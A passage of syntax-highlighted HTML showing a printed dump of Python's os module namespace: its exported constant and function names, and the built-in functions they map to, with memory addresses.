class="string">&#x27;EX_IOERR&#x27;</span>, <span class="string">&#x27;EX_NOHOST&#x27;</span>, <span class="string">&#x27;EX_NOINPUT&#x27;</span>, <span class="string">&#x27;EX_NOPERM&#x27;</span>, <span class="string">&#x27;EX_NOUSER&#x27;</span>, <span class="string">&#x27;EX_OK&#x27;</span>, <span class="string">&#x27;EX_OSERR&#x27;</span>, <span class="string">&#x27;EX_OSFILE&#x27;</span>, <span class="string">&#x27;EX_PROTOCOL&#x27;</span>, <span class="string">&#x27;EX_SOFTWARE&#x27;</span>, <span class="string">&#x27;EX_TEMPFAIL&#x27;</span>, <span class="string">&#x27;EX_UNAVAILABLE&#x27;</span>, <span class="string">&#x27;EX_USAGE&#x27;</span>, <span class="string">&#x27;F_LOCK&#x27;</span>, <span class="string">&#x27;F_OK&#x27;</span>, <span class="string">&#x27;F_TEST&#x27;</span>, <span class="string">&#x27;F_TLOCK&#x27;</span>, <span class="string">&#x27;F_ULOCK&#x27;</span>, <span class="string">&#x27;GRND_NONBLOCK&#x27;</span>, <span class="string">&#x27;GRND_RANDOM&#x27;</span>, <span class="string">&#x27;MFD_ALLOW_SEALING&#x27;</span>, <span class="string">&#x27;MFD_CLOEXEC&#x27;</span>, <span class="string">&#x27;MFD_HUGETLB&#x27;</span>, <span class="string">&#x27;MFD_HUGE_16GB&#x27;</span>, <span class="string">&#x27;MFD_HUGE_16MB&#x27;</span>, <span class="string">&#x27;MFD_HUGE_1GB&#x27;</span>, <span class="string">&#x27;MFD_HUGE_1MB&#x27;</span>, <span class="string">&#x27;MFD_HUGE_256MB&#x27;</span>, <span class="string">&#x27;MFD_HUGE_2GB&#x27;</span>, <span class="string">&#x27;MFD_HUGE_2MB&#x27;</span>, <span class="string">&#x27;MFD_HUGE_32MB&#x27;</span>, <span class="string">&#x27;MFD_HUGE_512KB&#x27;</span>, <span class="string">&#x27;MFD_HUGE_512MB&#x27;</span>, <span class="string">&#x27;MFD_HUGE_64KB&#x27;</span>, <span class="string">&#x27;MFD_HUGE_8MB&#x27;</span>, <span class="string">&#x27;MFD_HUGE_MASK&#x27;</span>, <span class="string">&#x27;MFD_HUGE_SHIFT&#x27;</span>, <span class="string">&#x27;NGROUPS_MAX&#x27;</span>, <span class="string">&#x27;O_ACCMODE&#x27;</span>, <span class="string">&#x27;O_APPEND&#x27;</span>, <span class="string">&#x27;O_ASYNC&#x27;</span>, <span class="string">&#x27;O_CLOEXEC&#x27;</span>, <span class="string">&#x27;O_CREAT&#x27;</span>, <span class="string">&#x27;O_DIRECT&#x27;</span>, <span class="string">&#x27;O_DIRECTORY&#x27;</span>, <span class="string">&#x27;O_DSYNC&#x27;</span>, <span class="string">&#x27;O_EXCL&#x27;</span>, <span class="string">&#x27;O_LARGEFILE&#x27;</span>, <span class="string">&#x27;O_NDELAY&#x27;</span>, <span class="string">&#x27;O_NOATIME&#x27;</span>, <span class="string">&#x27;O_NOCTTY&#x27;</span>, <span class="string">&#x27;O_NOFOLLOW&#x27;</span>, <span class="string">&#x27;O_NONBLOCK&#x27;</span>, <span class="string">&#x27;O_PATH&#x27;</span>, <span class="string">&#x27;O_RDONLY&#x27;</span>, <span class="string">&#x27;O_RDWR&#x27;</span>, <span class="string">&#x27;O_RSYNC&#x27;</span>, <span class="string">&#x27;O_SYNC&#x27;</span>, <span class="string">&#x27;O_TMPFILE&#x27;</span>, <span class="string">&#x27;O_TRUNC&#x27;</span>, <span class="string">&#x27;O_WRONLY&#x27;</span>, <span class="string">&#x27;POSIX_FADV_DONTNEED&#x27;</span>, <span class="string">&#x27;POSIX_FADV_NOREUSE&#x27;</span>, <span class="string">&#x27;POSIX_FADV_NORMAL&#x27;</span>, <span class="string">&#x27;POSIX_FADV_RANDOM&#x27;</span>, <span class="string">&#x27;POSIX_FADV_SEQUENTIAL&#x27;</span>, <span class="string">&#x27;POSIX_FADV_WILLNEED&#x27;</span>, <span class="string">&#x27;POSIX_SPAWN_CLOSE&#x27;</span>, <span class="string">&#x27;POSIX_SPAWN_DUP2&#x27;</span>, <span class="string">&#x27;POSIX_SPAWN_OPEN&#x27;</span>, <span class="string">&#x27;PRIO_PGRP&#x27;</span>, <span class="string">&#x27;PRIO_PROCESS&#x27;</span>, <span class="string">&#x27;PRIO_USER&#x27;</span>, <span class="string">&#x27;P_ALL&#x27;</span>, <span class="string">&#x27;P_PGID&#x27;</span>, <span class="string">&#x27;P_PID&#x27;</span>, <span class="string">&#x27;P_PIDFD&#x27;</span>, <span class="string">&#x27;RTLD_DEEPBIND&#x27;</span>, <span class="string">&#x27;RTLD_GLOBAL&#x27;</span>, <span class="string">&#x27;RTLD_LAZY&#x27;</span>, <span class="string">&#x27;RTLD_LOCAL&#x27;</span>, <span class="string">&#x27;RTLD_NODELETE&#x27;</span>, <span class="string">&#x27;RTLD_NOLOAD&#x27;</span>, <span class="string">&#x27;RTLD_NOW&#x27;</span>, <span class="string">&#x27;RWF_DSYNC&#x27;</span>, <span class="string">&#x27;RWF_HIPRI&#x27;</span>, <span class="string">&#x27;RWF_NOWAIT&#x27;</span>, <span class="string">&#x27;RWF_SYNC&#x27;</span>, <span class="string">&#x27;R_OK&#x27;</span>, <span class="string">&#x27;SCHED_BATCH&#x27;</span>, <span class="string">&#x27;SCHED_FIFO&#x27;</span>, <span class="string">&#x27;SCHED_IDLE&#x27;</span>, <span class="string">&#x27;SCHED_OTHER&#x27;</span>, <span class="string">&#x27;SCHED_RESET_ON_FORK&#x27;</span>, <span class="string">&#x27;SCHED_RR&#x27;</span>, <span class="string">&#x27;SEEK_DATA&#x27;</span>, <span class="string">&#x27;SEEK_HOLE&#x27;</span>, <span class="string">&#x27;ST_APPEND&#x27;</span>, <span class="string">&#x27;ST_MANDLOCK&#x27;</span>, <span class="string">&#x27;ST_NOATIME&#x27;</span>, <span class="string">&#x27;ST_NODEV&#x27;</span>, <span class="string">&#x27;ST_NODIRATIME&#x27;</span>, <span class="string">&#x27;ST_NOEXEC&#x27;</span>, <span class="string">&#x27;ST_NOSUID&#x27;</span>, <span class="string">&#x27;ST_RDONLY&#x27;</span>, <span class="string">&#x27;ST_RELATIME&#x27;</span>, <span class="string">&#x27;ST_SYNCHRONOUS&#x27;</span>, <span class="string">&#x27;ST_WRITE&#x27;</span>, <span class="string">&#x27;TMP_MAX&#x27;</span>, <span class="string">&#x27;WCONTINUED&#x27;</span>, <span class="string">&#x27;WCOREDUMP&#x27;</span>, <span class="string">&#x27;WEXITED&#x27;</span>, <span class="string">&#x27;WEXITSTATUS&#x27;</span>, <span class="string">&#x27;WIFCONTINUED&#x27;</span>, <span class="string">&#x27;WIFEXITED&#x27;</span>, <span class="string">&#x27;WIFSIGNALED&#x27;</span>, <span class="string">&#x27;WIFSTOPPED&#x27;</span>, <span class="string">&#x27;WNOHANG&#x27;</span>, <span class="string">&#x27;WNOWAIT&#x27;</span>, <span class="string">&#x27;WSTOPPED&#x27;</span>, <span class="string">&#x27;WSTOPSIG&#x27;</span>, <span class="string">&#x27;WTERMSIG&#x27;</span>, <span class="string">&#x27;WUNTRACED&#x27;</span>, <span class="string">&#x27;W_OK&#x27;</span>, <span class="string">&#x27;XATTR_CREATE&#x27;</span>, <span class="string">&#x27;XATTR_REPLACE&#x27;</span>, <span class="string">&#x27;XATTR_SIZE_MAX&#x27;</span>, <span class="string">&#x27;X_OK&#x27;</span>, <span class="string">&#x27;abort&#x27;</span>, <span class="string">&#x27;access&#x27;</span>, <span class="string">&#x27;chdir&#x27;</span>, <span class="string">&#x27;chmod&#x27;</span>, <span class="string">&#x27;chown&#x27;</span>, <span class="string">&#x27;chroot&#x27;</span>, <span class="string">&#x27;close&#x27;</span>, <span class="string">&#x27;closerange&#x27;</span>, <span class="string">&#x27;confstr&#x27;</span>, <span class="string">&#x27;confstr_names&#x27;</span>, <span class="string">&#x27;copy_file_range&#x27;</span>, <span class="string">&#x27;cpu_count&#x27;</span>, <span class="string">&#x27;ctermid&#x27;</span>, <span class="string">&#x27;device_encoding&#x27;</span>, <span class="string">&#x27;dup&#x27;</span>, <span class="string">&#x27;dup2&#x27;</span>, <span class="string">&#x27;environ&#x27;</span>, <span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;execv&#x27;</span>, <span class="string">&#x27;execve&#x27;</span>, <span class="string">&#x27;fchdir&#x27;</span>, <span class="string">&#x27;fchmod&#x27;</span>, <span class="string">&#x27;fchown&#x27;</span>, <span class="string">&#x27;fdatasync&#x27;</span>, <span class="string">&#x27;fork&#x27;</span>, <span class="string">&#x27;forkpty&#x27;</span>, <span class="string">&#x27;fpathconf&#x27;</span>, <span class="string">&#x27;fspath&#x27;</span>, <span class="string">&#x27;fstat&#x27;</span>, <span class="string">&#x27;fstatvfs&#x27;</span>, <span class="string">&#x27;fsync&#x27;</span>, <span class="string">&#x27;ftruncate&#x27;</span>, <span class="string">&#x27;get_blocking&#x27;</span>, <span class="string">&#x27;get_inheritable&#x27;</span>, <span class="string">&#x27;get_terminal_size&#x27;</span>, <span class="string">&#x27;getcwd&#x27;</span>, <span class="string">&#x27;getcwdb&#x27;</span>, <span class="string">&#x27;getegid&#x27;</span>, <span class="string">&#x27;geteuid&#x27;</span>, <span class="string">&#x27;getgid&#x27;</span>, <span class="string">&#x27;getgrouplist&#x27;</span>, <span class="string">&#x27;getgroups&#x27;</span>, <span class="string">&#x27;getloadavg&#x27;</span>, <span class="string">&#x27;getlogin&#x27;</span>, <span class="string">&#x27;getpgid&#x27;</span>, <span class="string">&#x27;getpgrp&#x27;</span>, <span class="string">&#x27;getpid&#x27;</span>, <span class="string">&#x27;getppid&#x27;</span>, <span class="string">&#x27;getpriority&#x27;</span>, <span class="string">&#x27;getrandom&#x27;</span>, <span class="string">&#x27;getresgid&#x27;</span>, <span class="string">&#x27;getresuid&#x27;</span>, <span class="string">&#x27;getsid&#x27;</span>, <span class="string">&#x27;getuid&#x27;</span>, <span class="string">&#x27;getxattr&#x27;</span>, <span class="string">&#x27;initgroups&#x27;</span>, <span class="string">&#x27;isatty&#x27;</span>, <span class="string">&#x27;kill&#x27;</span>, <span class="string">&#x27;killpg&#x27;</span>, <span class="string">&#x27;lchown&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;listdir&#x27;</span>, <span class="string">&#x27;listxattr&#x27;</span>, <span class="string">&#x27;lockf&#x27;</span>, <span class="string">&#x27;lseek&#x27;</span>, <span class="string">&#x27;lstat&#x27;</span>, <span class="string">&#x27;major&#x27;</span>, <span class="string">&#x27;makedev&#x27;</span>, <span class="string">&#x27;memfd_create&#x27;</span>, <span class="string">&#x27;minor&#x27;</span>, <span class="string">&#x27;mkdir&#x27;</span>, <span class="string">&#x27;mkfifo&#x27;</span>, <span class="string">&#x27;mknod&#x27;</span>, <span class="string">&#x27;nice&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;openpty&#x27;</span>, <span class="string">&#x27;pathconf&#x27;</span>, <span class="string">&#x27;pathconf_names&#x27;</span>, <span class="string">&#x27;pidfd_open&#x27;</span>, <span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;pipe2&#x27;</span>, <span class="string">&#x27;posix_fadvise&#x27;</span>, <span class="string">&#x27;posix_fallocate&#x27;</span>, <span class="string">&#x27;posix_spawn&#x27;</span>, <span class="string">&#x27;posix_spawnp&#x27;</span>, <span class="string">&#x27;pread&#x27;</span>, <span class="string">&#x27;preadv&#x27;</span>, <span class="string">&#x27;putenv&#x27;</span>, <span class="string">&#x27;pwrite&#x27;</span>, <span class="string">&#x27;pwritev&#x27;</span>, <span class="string">&#x27;read&#x27;</span>, <span class="string">&#x27;readlink&#x27;</span>, <span class="string">&#x27;readv&#x27;</span>, <span class="string">&#x27;register_at_fork&#x27;</span>, <span class="string">&#x27;remove&#x27;</span>, <span class="string">&#x27;removexattr&#x27;</span>, <span class="string">&#x27;rename&#x27;</span>, <span class="string">&#x27;replace&#x27;</span>, <span class="string">&#x27;rmdir&#x27;</span>, <span class="string">&#x27;scandir&#x27;</span>, <span class="string">&#x27;sched_get_priority_max&#x27;</span>, <span class="string">&#x27;sched_get_priority_min&#x27;</span>, <span class="string">&#x27;sched_getaffinity&#x27;</span>, <span class="string">&#x27;sched_getparam&#x27;</span>, <span class="string">&#x27;sched_getscheduler&#x27;</span>, <span class="string">&#x27;sched_param&#x27;</span>, <span class="string">&#x27;sched_rr_get_interval&#x27;</span>, <span class="string">&#x27;sched_setaffinity&#x27;</span>, <span class="string">&#x27;sched_setparam&#x27;</span>, <span class="string">&#x27;sched_setscheduler&#x27;</span>, <span class="string">&#x27;sched_yield&#x27;</span>, <span class="string">&#x27;sendfile&#x27;</span>, <span class="string">&#x27;set_blocking&#x27;</span>, <span class="string">&#x27;set_inheritable&#x27;</span>, <span class="string">&#x27;setegid&#x27;</span>, <span class="string">&#x27;seteuid&#x27;</span>, <span class="string">&#x27;setgid&#x27;</span>, <span class="string">&#x27;setgroups&#x27;</span>, <span class="string">&#x27;setpgid&#x27;</span>, <span class="string">&#x27;setpgrp&#x27;</span>, <span class="string">&#x27;setpriority&#x27;</span>, <span class="string">&#x27;setregid&#x27;</span>, <span class="string">&#x27;setresgid&#x27;</span>, <span class="string">&#x27;setresuid&#x27;</span>, <span class="string">&#x27;setreuid&#x27;</span>, <span class="string">&#x27;setsid&#x27;</span>, <span class="string">&#x27;setuid&#x27;</span>, <span class="string">&#x27;setxattr&#x27;</span>, <span class="string">&#x27;stat&#x27;</span>, <span class="string">&#x27;stat_result&#x27;</span>, <span class="string">&#x27;statvfs&#x27;</span>, <span class="string">&#x27;statvfs_result&#x27;</span>, <span class="string">&#x27;strerror&#x27;</span>, <span class="string">&#x27;symlink&#x27;</span>, <span class="string">&#x27;sync&#x27;</span>, <span class="string">&#x27;sysconf&#x27;</span>, <span class="string">&#x27;sysconf_names&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;tcgetpgrp&#x27;</span>, <span class="string">&#x27;tcsetpgrp&#x27;</span>, <span class="string">&#x27;terminal_size&#x27;</span>, <span class="string">&#x27;times&#x27;</span>, <span class="string">&#x27;times_result&#x27;</span>, <span class="string">&#x27;truncate&#x27;</span>, <span class="string">&#x27;ttyname&#x27;</span>, <span class="string">&#x27;umask&#x27;</span>, <span class="string">&#x27;uname&#x27;</span>, <span class="string">&#x27;uname_result&#x27;</span>, <span class="string">&#x27;unlink&#x27;</span>, <span class="string">&#x27;unsetenv&#x27;</span>, <span class="string">&#x27;urandom&#x27;</span>, <span class="string">&#x27;utime&#x27;</span>, <span class="string">&#x27;wait&#x27;</span>, <span class="string">&#x27;wait3&#x27;</span>, <span class="string">&#x27;wait4&#x27;</span>, <span class="string">&#x27;waitid&#x27;</span>, <span class="string">&#x27;waitid_result&#x27;</span>, <span class="string">&#x27;waitpid&#x27;</span>, <span class="string">&#x27;waitstatus_to_exitcode&#x27;</span>, <span class="string">&#x27;write&#x27;</span>, <span class="string">&#x27;writev&#x27;</span>, <span class="string">&#x27;makedirs&#x27;</span>, <span class="string">&#x27;removedirs&#x27;</span>, <span class="string">&#x27;renames&#x27;</span>, <span class="string">&#x27;walk&#x27;</span>, <span class="string">&#x27;fwalk&#x27;</span>, <span class="string">&#x27;execl&#x27;</span>, <span class="string">&#x27;execle&#x27;</span>, <span class="string">&#x27;execlp&#x27;</span>, <span class="string">&#x27;execlpe&#x27;</span>, <span class="string">&#x27;execvp&#x27;</span>, <span class="string">&#x27;execvpe&#x27;</span>, <span class="string">&#x27;getenv&#x27;</span>, <span class="string">&#x27;supports_bytes_environ&#x27;</span>, <span class="string">&#x27;environb&#x27;</span>, <span class="string">&#x27;getenvb&#x27;</span>, <span class="string">&#x27;P_WAIT&#x27;</span>, <span class="string">&#x27;P_NOWAIT&#x27;</span>, <span class="string">&#x27;P_NOWAITO&#x27;</span>, <span class="string">&#x27;spawnv&#x27;</span>, <span class="string">&#x27;spawnve&#x27;</span>, <span class="string">&#x27;spawnvp&#x27;</span>, <span class="string">&#x27;spawnvpe&#x27;</span>, <span class="string">&#x27;spawnl&#x27;</span>, <span class="string">&#x27;spawnle&#x27;</span>, <span class="string">&#x27;spawnlp&#x27;</span>, <span class="string">&#x27;spawnlpe&#x27;</span>], <span class="string">&#x27;_exists&#x27;</span>: &lt;function _exists at <span class="number">0x7fc7ef5478b0</span>&gt;, <span class="string">&#x27;_get_exports_list&#x27;</span>: &lt;function _get_exports_list at <span class="number">0x7fc7ef547ca0</span>&gt;, <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;posix&#x27;</span>, <span class="string">&#x27;linesep&#x27;</span>: <span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;stat&#x27;</span>: &lt;built-<span class="keyword">in</span> function stat&gt;, <span class="string">&#x27;access&#x27;</span>: &lt;built-<span class="keyword">in</span> function access&gt;, <span class="string">&#x27;ttyname&#x27;</span>: &lt;built-<span class="keyword">in</span> function ttyname&gt;, <span class="string">&#x27;chdir&#x27;</span>: &lt;built-<span class="keyword">in</span> function chdir&gt;, <span class="string">&#x27;chmod&#x27;</span>: &lt;built-<span class="keyword">in</span> function chmod&gt;, <span class="string">&#x27;fchmod&#x27;</span>: &lt;built-<span class="keyword">in</span> function fchmod&gt;, <span class="string">&#x27;chown&#x27;</span>: &lt;built-<span class="keyword">in</span> function chown&gt;, <span class="string">&#x27;fchown&#x27;</span>: &lt;built-<span class="keyword">in</span> function fchown&gt;, <span class="string">&#x27;lchown&#x27;</span>: &lt;built-<span class="keyword">in</span> function lchown&gt;, <span class="string">&#x27;chroot&#x27;</span>: &lt;built-<span class="keyword">in</span> function chroot&gt;, <span class="string">&#x27;ctermid&#x27;</span>: &lt;built-<span class="keyword">in</span> function ctermid&gt;, <span class="string">&#x27;getcwd&#x27;</span>: &lt;built-<span class="keyword">in</span> function getcwd&gt;, <span class="string">&#x27;getcwdb&#x27;</span>: &lt;built-<span class="keyword">in</span> function getcwdb&gt;, <span class="string">&#x27;link&#x27;</span>: &lt;built-<span class="keyword">in</span> function link&gt;, <span class="string">&#x27;listdir&#x27;</span>: &lt;built-<span class="keyword">in</span> function listdir&gt;, <span class="string">&#x27;lstat&#x27;</span>: &lt;built-<span class="keyword">in</span> function lstat&gt;, <span class="string">&#x27;mkdir&#x27;</span>: &lt;built-<span class="keyword">in</span> function mkdir&gt;, <span class="string">&#x27;nice&#x27;</span>: &lt;built-<span class="keyword">in</span> function nice&gt;, <span class="string">&#x27;getpriority&#x27;</span>: &lt;built-<span class="keyword">in</span> function getpriority&gt;, <span class="string">&#x27;setpriority&#x27;</span>: &lt;built-<span class="keyword">in</span> function setpriority&gt;, <span class="string">&#x27;posix_spawn&#x27;</span>: &lt;built-<span class="keyword">in</span> function posix_spawn&gt;, <span class="string">&#x27;posix_spawnp&#x27;</span>: &lt;built-<span class="keyword">in</span> function posix_spawnp&gt;, <span class="string">&#x27;readlink&#x27;</span>: &lt;built-<span class="keyword">in</span> function readlink&gt;, <span class="string">&#x27;copy_file_range&#x27;</span>: &lt;built-<span class="keyword">in</span> function copy_file_range&gt;, <span class="string">&#x27;rename&#x27;</span>: &lt;built-<span class="keyword">in</span> function rename&gt;, <span class="string">&#x27;replace&#x27;</span>: &lt;built-<span class="keyword">in</span> function replace&gt;, <span class="string">&#x27;rmdir&#x27;</span>: &lt;built-<span class="keyword">in</span> function rmdir&gt;, <span class="string">&#x27;symlink&#x27;</span>: &lt;built-<span class="keyword">in</span> function symlink&gt;, <span class="string">&#x27;system&#x27;</span>: &lt;built-<span class="keyword">in</span> function system&gt;, <span class="string">&#x27;umask&#x27;</span>: &lt;built-<span class="keyword">in</span> function umask&gt;, <span class="string">&#x27;uname&#x27;</span>: &lt;built-<span class="keyword">in</span> function uname&gt;, <span class="string">&#x27;unlink&#x27;</span>: &lt;built-<span class="keyword">in</span> function unlink&gt;, <span class="string">&#x27;remove&#x27;</span>: &lt;built-<span class="keyword">in</span> function remove&gt;, <span class="string">&#x27;utime&#x27;</span>: &lt;built-<span class="keyword">in</span> function utime&gt;, <span class="string">&#x27;times&#x27;</span>: &lt;built-<span class="keyword">in</span> function times&gt;, <span class="string">&#x27;execv&#x27;</span>: &lt;built-<span class="keyword">in</span> function execv&gt;, <span class="string">&#x27;execve&#x27;</span>: &lt;built-<span class="keyword">in</span> function execve&gt;, <span class="string">&#x27;fork&#x27;</span>: &lt;built-<span class="keyword">in</span> function fork&gt;, <span class="string">&#x27;register_at_fork&#x27;</span>: &lt;built-<span class="keyword">in</span> function register_at_fork&gt;, <span class="string">&#x27;sched_get_priority_max&#x27;</span>: &lt;built-<span class="keyword">in</span> function sched_get_priority_max&gt;, <span class="string">&#x27;sched_get_priority_min&#x27;</span>: &lt;built-<span class="keyword">in</span> function sched_get_priority_min&gt;, <span class="string">&#x27;sched_getparam&#x27;</span>: &lt;built-<span class="keyword">in</span> function sched_getparam&gt;, <span class="string">&#x27;sched_getscheduler&#x27;</span>: &lt;built-<span class="keyword">in</span> function sched_getscheduler&gt;, <span class="string">&#x27;sched_rr_get_interval&#x27;</span>: &lt;built-<span class="keyword">in</span> function sched_rr_get_interval&gt;, <span class="string">&#x27;sched_setparam&#x27;</span>: &lt;built-<span class="keyword">in</span> function sched_setparam&gt;, <span class="string">&#x27;sched_setscheduler&#x27;</span>: &lt;built-<span class="keyword">in</span> function sched_setscheduler&gt;, <span class="string">&#x27;sched_yield&#x27;</span>: &lt;built-<span class="keyword">in</span> function sched_yield&gt;, <span class="string">&#x27;sched_setaffinity&#x27;</span>: &lt;built-<span class="keyword">in</span> function sched_setaffinity&gt;, <span class="string">&#x27;sched_getaffinity&#x27;</span>: &lt;built-<span class="keyword">in</span> function sched_getaffinity&gt;, <span class="string">&#x27;openpty&#x27;</span>: &lt;built-<span class="keyword">in</span> function openpty&gt;, <span class="string">&#x27;forkpty&#x27;</span>: &lt;built-<span class="keyword">in</span> function forkpty&gt;, <span class="string">&#x27;getegid&#x27;</span>: &lt;built-<span class="keyword">in</span> function getegid&gt;, <span class="string">&#x27;geteuid&#x27;</span>: &lt;built-<span class="keyword">in</span> function geteuid&gt;, <span class="string">&#x27;getgid&#x27;</span>: &lt;built-<span class="keyword">in</span> function getgid&gt;, <span class="string">&#x27;getgrouplist&#x27;</span>: &lt;built-<span class="keyword">in</span> function getgrouplist&gt;, <span class="string">&#x27;getgroups&#x27;</span>: &lt;built-<span class="keyword">in</span> function getgroups&gt;, <span class="string">&#x27;getpid&#x27;</span>: &lt;built-<span class="keyword">in</span> function getpid&gt;, <span class="string">&#x27;getpgrp&#x27;</span>: &lt;built-<span class="keyword">in</span> function getpgrp&gt;, <span class="string">&#x27;getppid&#x27;</span>: &lt;built-<span class="keyword">in</span> function getppid&gt;, <span class="string">&#x27;getuid&#x27;</span>: &lt;built-<span class="keyword">in</span> function getuid&gt;, <span class="string">&#x27;getlogin&#x27;</span>: &lt;built-<span class="keyword">in</span> function getlogin&gt;, <span class="string">&#x27;kill&#x27;</span>: &lt;built-<span class="keyword">in</span> function kill&gt;, <span class="string">&#x27;killpg&#x27;</span>: &lt;built-<span class="keyword">in</span> function killpg&gt;, <span class="string">&#x27;setuid&#x27;</span>: &lt;built-<span class="keyword">in</span> function setuid&gt;, <span class="string">&#x27;seteuid&#x27;</span>: &lt;built-<span class="keyword">in</span> function seteuid&gt;, <span class="string">&#x27;setreuid&#x27;</span>: &lt;built-<span class="keyword">in</span> function setreuid&gt;, <span class="string">&#x27;setgid&#x27;</span>: &lt;built-<span class="keyword">in</span> function setgid&gt;, <span class="string">&#x27;setegid&#x27;</span>: &lt;built-<span class="keyword">in</span> function setegid&gt;, <span class="string">&#x27;setregid&#x27;</span>: &lt;built-<span class="keyword">in</span> function setregid&gt;, <span class="string">&#x27;setgroups&#x27;</span>: &lt;built-<span class="keyword">in</span> function setgroups&gt;, <span class="string">&#x27;initgroups&#x27;</span>: &lt;built-<span class="keyword">in</span> function initgroups&gt;, <span class="string">&#x27;getpgid&#x27;</span>: &lt;built-<span class="keyword">in</span> function getpgid&gt;, <span class="string">&#x27;setpgrp&#x27;</span>: &lt;built-<span class="keyword">in</span> function setpgrp&gt;, <span class="string">&#x27;wait&#x27;</span>: &lt;built-<span class="keyword">in</span> function wait&gt;, <span class="string">&#x27;wait3&#x27;</span>: &lt;built-<span class="keyword">in</span> function wait3&gt;, <span class="string">&#x27;wait4&#x27;</span>: &lt;built-<span class="keyword">in</span> function wait4&gt;, <span class="string">&#x27;waitid&#x27;</span>: &lt;built-<span class="keyword">in</span> function waitid&gt;, <span class="string">&#x27;waitpid&#x27;</span>: &lt;built-<span class="keyword">in</span> function waitpid&gt;, <span class="string">&#x27;pidfd_open&#x27;</span>: &lt;built-<span class="keyword">in</span> function pidfd_open&gt;, <span class="string">&#x27;getsid&#x27;</span>: &lt;built-<span class="keyword">in</span> function getsid&gt;, <span class="string">&#x27;setsid&#x27;</span>: &lt;built-<span class="keyword">in</span> function setsid&gt;, <span class="string">&#x27;setpgid&#x27;</span>: &lt;built-<span class="keyword">in</span> function setpgid&gt;, <span class="string">&#x27;tcgetpgrp&#x27;</span>: &lt;built-<span class="keyword">in</span> function tcgetpgrp&gt;, <span class="string">&#x27;tcsetpgrp&#x27;</span>: &lt;built-<span class="keyword">in</span> function tcsetpgrp&gt;, <span class="string">&#x27;open&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">open</span>&gt;, <span class="string">&#x27;close&#x27;</span>: &lt;built-<span class="keyword">in</span> function close&gt;, <span class="string">&#x27;closerange&#x27;</span>: &lt;built-<span class="keyword">in</span> function closerange&gt;, <span class="string">&#x27;device_encoding&#x27;</span>: &lt;built-<span class="keyword">in</span> function device_encoding&gt;, <span class="string">&#x27;dup&#x27;</span>: &lt;built-<span class="keyword">in</span> function dup&gt;, <span class="string">&#x27;dup2&#x27;</span>: &lt;built-<span class="keyword">in</span> function dup2&gt;, <span class="string">&#x27;lockf&#x27;</span>: &lt;built-<span class="keyword">in</span> function lockf&gt;, <span class="string">&#x27;lseek&#x27;</span>: &lt;built-<span class="keyword">in</span> function lseek&gt;, <span class="string">&#x27;read&#x27;</span>: &lt;built-<span class="keyword">in</span> function read&gt;, <span class="string">&#x27;readv&#x27;</span>: &lt;built-<span class="keyword">in</span> function readv&gt;, <span class="string">&#x27;pread&#x27;</span>: &lt;built-<span class="keyword">in</span> function pread&gt;, <span class="string">&#x27;preadv&#x27;</span>: &lt;built-<span class="keyword">in</span> function preadv&gt;, <span class="string">&#x27;write&#x27;</span>: &lt;built-<span class="keyword">in</span> function write&gt;, <span class="string">&#x27;writev&#x27;</span>: &lt;built-<span class="keyword">in</span> function writev&gt;, <span class="string">&#x27;pwrite&#x27;</span>: &lt;built-<span class="keyword">in</span> function pwrite&gt;, <span class="string">&#x27;pwritev&#x27;</span>: &lt;built-<span class="keyword">in</span> function pwritev&gt;, <span class="string">&#x27;sendfile&#x27;</span>: &lt;built-<span class="keyword">in</span> function sendfile&gt;, <span class="string">&#x27;fstat&#x27;</span>: &lt;built-<span class="keyword">in</span> function fstat&gt;, <span class="string">&#x27;isatty&#x27;</span>: &lt;built-<span class="keyword">in</span> function isatty&gt;, <span class="string">&#x27;pipe&#x27;</span>: &lt;built-<span class="keyword">in</span> function pipe&gt;, <span class="string">&#x27;pipe2&#x27;</span>: &lt;built-<span class="keyword">in</span> function pipe2&gt;, <span class="string">&#x27;mkfifo&#x27;</span>: &lt;built-<span class="keyword">in</span> function mkfifo&gt;, <span class="string">&#x27;mknod&#x27;</span>: &lt;built-<span class="keyword">in</span> function mknod&gt;, <span class="string">&#x27;major&#x27;</span>: &lt;built-<span class="keyword">in</span> function major&gt;, <span class="string">&#x27;minor&#x27;</span>: &lt;built-<span class="keyword">in</span> function minor&gt;, <span class="string">&#x27;makedev&#x27;</span>: &lt;built-<span class="keyword">in</span> function makedev&gt;, <span class="string">&#x27;ftruncate&#x27;</span>: &lt;built-<span class="keyword">in</span> function ftruncate&gt;, <span class="string">&#x27;truncate&#x27;</span>: &lt;built-<span class="keyword">in</span> function truncate&gt;, <span class="string">&#x27;posix_fallocate&#x27;</span>: &lt;built-<span class="keyword">in</span> function posix_fallocate&gt;, <span class="string">&#x27;posix_fadvise&#x27;</span>: &lt;built-<span class="keyword">in</span> function posix_fadvise&gt;, <span class="string">&#x27;putenv&#x27;</span>: &lt;built-<span class="keyword">in</span> function putenv&gt;, <span class="string">&#x27;unsetenv&#x27;</span>: &lt;built-<span class="keyword">in</span> function unsetenv&gt;, <span class="string">&#x27;strerror&#x27;</span>: &lt;built-<span class="keyword">in</span> function strerror&gt;, <span class="string">&#x27;fchdir&#x27;</span>: &lt;built-<span class="keyword">in</span> function fchdir&gt;, <span class="string">&#x27;fsync&#x27;</span>: &lt;built-<span class="keyword">in</span> function fsync&gt;, <span class="string">&#x27;sync&#x27;</span>: &lt;built-<span class="keyword">in</span> function sync&gt;, <span class="string">&#x27;fdatasync&#x27;</span>: &lt;built-<span class="keyword">in</span> function fdatasync&gt;, <span class="string">&#x27;WCOREDUMP&#x27;</span>: &lt;built-<span class="keyword">in</span> function WCOREDUMP&gt;, <span class="string">&#x27;WIFCONTINUED&#x27;</span>: &lt;built-<span class="keyword">in</span> function WIFCONTINUED&gt;, <span class="string">&#x27;WIFSTOPPED&#x27;</span>: &lt;built-<span class="keyword">in</span> function WIFSTOPPED&gt;, <span class="string">&#x27;WIFSIGNALED&#x27;</span>: &lt;built-<span class="keyword">in</span> function WIFSIGNALED&gt;, <span class="string">&#x27;WIFEXITED&#x27;</span>: &lt;built-<span class="keyword">in</span> function WIFEXITED&gt;, <span class="string">&#x27;WEXITSTATUS&#x27;</span>: &lt;built-<span class="keyword">in</span> function 